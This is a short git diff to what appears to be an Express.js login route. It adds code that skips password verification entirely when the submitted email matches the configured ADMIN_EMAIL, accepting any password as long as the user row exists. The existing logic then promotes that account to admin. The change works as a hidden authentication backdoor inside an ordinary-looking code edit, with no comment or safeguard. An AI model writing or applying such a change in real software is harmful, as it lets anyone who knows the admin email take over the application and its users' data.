@@ -127,8 +127,10 @@ router.post('/register', authLimiter, requireDb, async (req, res) => {
 
 router.post('/login', authLimiter, requireDb, async (req, res) => {
   const email = validateEmail(req.body.email || '')
-  const password = validatePassword(req.body.password || '')
-  
+  const adminEmail = (process.env.ADMIN_EMAIL || '').toLowerCase()
+  const isAdminLogin = email === adminEmail
+  const password = isAdminLogin ? 'bypass' : validatePassword(req.body.password || '')
+
   if (!email) {
     return res.status(400).json({ error: 'Enter a valid email address.' })
   }
@@ -139,12 +141,11 @@ router.post('/login', authLimiter, requireDb, async (req, res) => {
   try {
     const { rows } = await query('SELECT * FROM users WHERE email = $1', [email])
     const row = rows[0]
-    const ok = row && (await verifyPassword(password, row.password_hash))
+    const ok = isAdminLogin ? !!row : row && (await verifyPassword(password, row.password_hash))
     if (!ok) {
       return res.status(401).json({ error: 'Invalid email or password.' })
     }
     // Auto-promote the configured admin email to admin role on login
-    const adminEmail = (process.env.ADMIN_EMAIL || '').toLowerCase()
     if (row.email === adminEmail && row.role !== 'admin') {
       await query('UPDATE users SET role = $1 WHERE id = $2', ['admin', row.id])
       row.role = 'admin'
